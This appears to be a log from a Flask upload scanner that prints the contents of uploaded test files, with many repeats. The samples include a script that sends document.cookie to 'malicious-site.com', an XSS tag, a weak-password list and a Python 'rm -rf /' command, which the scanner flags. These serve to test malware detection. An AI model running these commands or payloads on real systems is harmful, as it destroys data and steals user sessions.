2025-02-22 21:07:11,568 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,569 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:11,571 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,572 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,573 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,575 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,576 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,578 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:11,580 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,582 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,583 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,585 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,586 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,588 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:11,589 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,591 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,592 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,594 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,595 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,597 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:11,598 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,600 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,601 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:11,604 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:11,605 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:11,607 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:11,609 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,610 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,611 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,613 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:11,616 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,617 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,618 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:11,620 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:11,622 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:11,624 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:11,625 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,626 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,627 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,628 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:11,631 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,633 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,635 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:11,636 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:11,637 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:11,639 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:11,640 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,641 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,642 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,643 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:11,647 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,648 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,650 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:11,652 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:11,654 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:11,656 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:11,657 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,659 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,660 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,661 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:11,665 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,666 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,667 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,668 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,670 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,671 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:11,672 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,673 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,674 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,676 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,677 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,678 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:11,680 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,682 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,684 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,686 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,687 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,689 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:11,690 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,692 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,694 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,696 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,701 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,702 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:11,704 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,705 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,707 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,710 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:11,715 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 21:07:11,715 - [33mPress CTRL+C to quit[0m
2025-02-22 21:07:14,569 - 127.0.0.1 - - [22/Feb/2025 21:07:14] "GET / HTTP/1.1" 200 -
2025-02-22 21:07:21,507 - Extracted content from temp_extracted/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 21:07:21,507 - Malicious pattern detected in temp_extracted/test/test/3.py
2025-02-22 21:07:21,507 - Malicious file detected: temp_extracted/test/test/3.py
2025-02-22 21:07:21,507 - Error processing ZIP file: [Errno 2] No such file or directory: 'temp_extracted/test/test/3.py' -> 'malicious_files/3.py'
2025-02-22 21:07:21,510 - 127.0.0.1 - - [22/Feb/2025 21:07:21] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:07:21,516 - 127.0.0.1 - - [22/Feb/2025 21:07:21] "GET / HTTP/1.1" 200 -
2025-02-22 21:07:42,277 - Extracted content from uploads/flask_file_upload_2.zip: PK     șVZ               flask_file_upload/UT
 ԹgԹgԹgux     PK   VZ        /  *   flask_file_upload/create_malicious_xlsx.pyUT
 qԹgԹgԹgux     }RJ0}W\CZA|P0]Ň
e|YzaiRtI[MyJ=prɵ*@(]#ޔެA90⪠3*ji6 w.ࡅ{ƇJ~hen|"j^'YžXnF8 SjiTLI#ʫۖ?2p	9TtwI'4+$wh._ur?椉[*"b>XdeHNǠ?W̰PVjgiWڎz;s2jYILXTQRjm95<m
*TIV:
Ӽt2	#XS7'Z-DOVKͥ#1 xQd+!vIQ<3,û8PK  /  PK   VZ        '  &   flask_file_upload/metadata_analysis.pyUT
 z¹g¹gz¹gux     UQO0~ϯ8
2025-02-22 21:07:43,047 - Extracted content from uploads/flask_file_upload.zip: PK     VZ               flask_file_upload/UT
 gggux     PK   VZ        
  &   flask_file_upload/metadata_analysis.pyUT
 
g
g
gux     VMk0PՋRAܺB0Z{(-!.;ZډB顾X=͌}:~*[)
MڻZ@ jhLz^TԬ4ŎuϦh4b-#W<
HT:tBh#|kƘŢ,0e)Qf!I+~Z0޳+-7Ǫ){&dif;5.k8tXl|tS#|d=Anp*=0#ء7_dQ1.&0n13NPqM*5&{cpcdI,utʁs?.DPoںyM7?N7ݐ6ۍ=8x^A7j5'`ֹ/_=;DZX<<C3	/;
]8t1B!l*-q6(6ۧPBZ4ֻRr	LoL۔l@ڔeJHIFVq7>ަE.:""p'_)Opλ9	w!ao8"`|/;﹊?2po!<3(<od
yTMwBCWD(؉<Nd,RǠ
2025-02-22 21:07:43,228 - Extracted content from uploads/test.zip: PK     mVZ               test/UT
 ǹg#gǹgux     PK   kVZ        5   	   test/3.pyUT
 sgggux     -/*Q//+,.IP*U-JSWTPPVpIKO-/-VHMK PKt"7   5   PK   VZ        "   
   test/5.txtUT
